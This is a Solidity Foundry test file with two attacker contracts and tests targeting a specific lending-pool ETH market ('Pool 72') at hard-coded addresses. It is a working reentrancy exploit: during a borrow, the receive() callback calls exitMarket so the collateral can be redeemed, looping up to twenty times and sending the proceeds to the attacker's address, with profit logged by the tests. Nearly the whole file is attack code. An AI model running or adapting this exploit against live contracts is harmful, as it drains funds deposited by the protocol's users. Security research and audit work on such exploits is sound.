// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IComptroller {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function exitMarket(address cToken) external returns (uint256);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
    function markets(address) external view returns (bool, uint256);
}

interface ICEther {
    function mint() external payable;
    function borrow(uint256 borrowAmount) external returns (uint256);
    function repayBorrow() external payable;
    function redeem(uint256 redeemTokens) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function getCash() external view returns (uint256);
    function totalBorrows() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function totalReserves() external view returns (uint256);
    function totalFuseFees() external view returns (uint256);
    function totalAdminFees() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function borrowBalanceStored(address) external view returns (uint256);
    function exchangeRateStored() external view returns (uint256);
    function transfer(address dst, uint256 amount) external returns (bool);
    function accrueInterest() external returns (uint256);
}

/// @dev Try borrowing less than cash - reserves so exchangeRate doesn't underflow during exitMarket
contract Pool72SmallBorrowAttacker {
    IComptroller constant COMPTROLLER = IComptroller(0xDcc615Ba569e60c7eD31B74686624fC1770bdD9A);
    ICEther constant FETH72 = ICEther(0x8Ea8Fcd938D45D2461e023b96044Acab4780F07b);

    address payable immutable owner;
    bool borrowInFlight;
    bool reentered;
    uint256 public exitCode;
    uint256 public borrowAmt;

    constructor(address payable _owner) {
        owner = _owner;
    }

    function attack(uint256 _borrowAmt) external payable {
        borrowAmt = _borrowAmt;
        uint256 cash = FETH72.getCash();
        uint256 reserves = FETH72.totalReserves();
        uint256 fuseFees = FETH72.totalFuseFees();
        uint256 adminFees = FETH72.totalAdminFees();
        uint256 totalBorrows = FETH72.totalBorrows();
        uint256 totalSupply = FETH72.totalSupply();

        console.log("Cash:", cash);
        console.log("Reserves:", reserves);
        console.log("Borrow amount:", _borrowAmt);
        // After borrow: cash' = cash - borrowAmt, totalBorrows' = totalBorrows + borrowAmt
        // exchangeRate = (cash' + totalBorrows' - reserves - fuseFees - adminFees) / totalSupply
        // = (cash - borrowAmt + totalBorrows + borrowAmt - reserves - fuseFees - adminFees) / totalSupply
        // = (cash + totalBorrows - reserves - fuseFees - adminFees) / totalSupply
        // Wait... the exchange rate shouldn't change from borrowing! The numerator stays the same.
        // So why does it revert?

        // Actually: during doTransferOut, the ETH is sent BEFORE totalBorrows is updated.
        // So: cash' = cash - borrowAmt (ETH already sent), totalBorrows' = totalBorrows (not yet updated)
        // exchangeRate = (cash - borrowAmt + totalBorrows - reserves) / totalSupply
        // This underflows if borrowAmt > cash + totalBorrows - reserves
        // = borrowAmt > 73.74 + 0 - 0.756 = 72.98
        // So we need borrowAmt <= 72.98 ETH

        uint256 safeMax = cash + totalBorrows - reserves - fuseFees - adminFees;
        console.log("Safe max borrow (before underflow):", safeMax);
        console.log("Borrow is safe:", _borrowAmt <= safeMax);

        FETH72.mint{value: msg.value}();
        uint256 cTokens = FETH72.balanceOf(address(this));
        console.log("cTokens minted:", cTokens);

        address[] memory markets = new address[](1);
        markets[0] = address(FETH72);
        COMPTROLLER.enterMarkets(markets);

        borrowInFlight = true;
        uint256 borrowResult = FETH72.borrow(_borrowAmt);
        borrowInFlight = false;

        console.log("Borrow result:", borrowResult);
        console.log("Reentered:", reentered);
        console.log("Exit code:", exitCode);

        if (reentered && exitCode == 0) {
            uint256 redeemResult = FETH72.redeem(FETH72.balanceOf(address(this)));
            console.log("Redeem result:", redeemResult);
        }

        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }

    receive() external payable {
        if (!borrowInFlight || reentered) return;
        reentered = true;
        console.log("=== REENTRANT CALLBACK ===");
        console.log("ETH received:", msg.value);

        exitCode = COMPTROLLER.exitMarket(address(FETH72));
        console.log("exitMarket result:", exitCode);
    }
}

/// @dev Iterative version: borrow safe amount, exit, redeem, repeat
contract Pool72IterativeAttacker {
    IComptroller constant COMPTROLLER = IComptroller(0xDcc615Ba569e60c7eD31B74686624fC1770bdD9A);
    ICEther constant FETH72 = ICEther(0x8Ea8Fcd938D45D2461e023b96044Acab4780F07b);

    address payable immutable owner;
    bool borrowInFlight;
    bool reentered;
    uint256 public exitCode;
    uint256 public borrowTarget;

    constructor(address payable _owner) {
        owner = _owner;
    }

    function attack() external payable {
        uint256 depositAmount = msg.value;
        uint256 totalProfit = 0;

        for (uint256 i = 0; i < 20; i++) {
            uint256 cash = FETH72.getCash();
            if (cash < 0.01 ether) break;

            uint256 reserves = FETH72.totalReserves();
            uint256 fuseFees = FETH72.totalFuseFees();
            uint256 adminFees = FETH72.totalAdminFees();
            uint256 totalBorrows = FETH72.totalBorrows();

            // Safe borrow amount: must not cause exchangeRate underflow
            // During doTransferOut: numerator = cash - borrowAmt + totalBorrows - reserves - fuseFees - adminFees
            // Must be >= 0, so borrowAmt <= cash + totalBorrows - reserves - fuseFees - adminFees
            uint256 safeMax = cash + totalBorrows - reserves - fuseFees - adminFees;
            if (safeMax < 0.001 ether) break;

            // We need 2x collateral for 50% CF
            uint256 maxBorrowFromCollateral = address(this).balance / 2;
            uint256 borrowAmt = safeMax < maxBorrowFromCollateral ? safeMax : maxBorrowFromCollateral;
            if (borrowAmt > cash - 1) borrowAmt = cash - 1;
            if (borrowAmt < 0.001 ether) break;

            // Need collateral = borrowAmt * 2
            uint256 collateralNeeded = borrowAmt * 2 + 1 ether; // margin
            if (collateralNeeded > address(this).balance) {
                collateralNeeded = address(this).balance;
                borrowAmt = collateralNeeded / 2 - 1;
            }

            console.log("=== Iteration", i, "===");
            console.log("Cash:", cash);
            console.log("Borrow:", borrowAmt);
            console.log("Collateral:", collateralNeeded);

            FETH72.mint{value: collateralNeeded}();

            address[] memory markets = new address[](1);
            markets[0] = address(FETH72);
            COMPTROLLER.enterMarkets(markets);

            borrowTarget = borrowAmt;
            borrowInFlight = true;
            reentered = false;
            uint256 borrowResult = FETH72.borrow(borrowAmt);
            borrowInFlight = false;

            if (borrowResult != 0) {
                console.log("Borrow failed:", borrowResult);
                break;
            }

            if (!reentered || exitCode != 0) {
                console.log("Reentrancy failed. Exit code:", exitCode);
                break;
            }

            // Redeem collateral
            uint256 cTokens = FETH72.balanceOf(address(this));
            if (cTokens > 0) {
                uint256 redeemResult = FETH72.redeem(cTokens);
                console.log("Redeem result:", redeemResult);
            }

            console.log("Balance after iteration:", address(this).balance);
        }

        console.log("Final balance:", address(this).balance);
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }

    receive() external payable {
        if (!borrowInFlight || reentered) return;
        reentered = true;

        exitCode = COMPTROLLER.exitMarket(address(FETH72));
    }
}

contract Pool72Test2 is Test {
    ICEther constant FETH72 = ICEther(0x8Ea8Fcd938D45D2461e023b96044Acab4780F07b);

    address payable attacker;

    function setUp() public {
        attacker = payable(address(0xBEEF));
        vm.deal(attacker, 500 ether);
    }

    function testPool72SmallBorrow() public {
        console.log("=== Pool 72 Small Borrow Attack ===");

        uint256 cash = FETH72.getCash();
        uint256 reserves = FETH72.totalReserves();
        uint256 safeMax = cash - reserves;
        console.log("Safe max borrow:", safeMax);

        // Borrow less than safeMax, e.g., safeMax - 1 ether margin
        uint256 borrowAmt = safeMax - 0.1 ether;
        // Need 2x collateral for 50% CF
        uint256 depositAmount = borrowAmt * 2 + 1 ether;

        console.log("Deposit:", depositAmount);
        console.log("Borrow:", borrowAmt);

        vm.startPrank(attacker);
        Pool72SmallBorrowAttacker attackContract = new Pool72SmallBorrowAttacker(attacker);
        uint256 balBefore = attacker.balance;
        attackContract.attack{value: depositAmount}(borrowAmt);
        uint256 balAfter = attacker.balance;
        console.log("Balance before:", balBefore);
        console.log("Balance after:", balAfter);
        if (balAfter > balBefore) {
            console.log("PROFIT:", balAfter - balBefore);
        } else {
            console.log("LOSS:", balBefore - balAfter);
        }
        vm.stopPrank();
    }

    function testPool72Iterative() public {
        console.log("=== Pool 72 Iterative Attack ===");

        vm.startPrank(attacker);
        Pool72IterativeAttacker attackContract = new Pool72IterativeAttacker(attacker);
        uint256 balBefore = attacker.balance;
        attackContract.attack{value: 200 ether}();
        uint256 balAfter = attacker.balance;
        console.log("Balance before:", balBefore);
        console.log("Balance after:", balAfter);
        if (balAfter > balBefore) {
            console.log("PROFIT:", balAfter - balBefore);
        } else {
            console.log("LOSS:", balBefore - balAfter);
        }
        vm.stopPrank();
    }
}
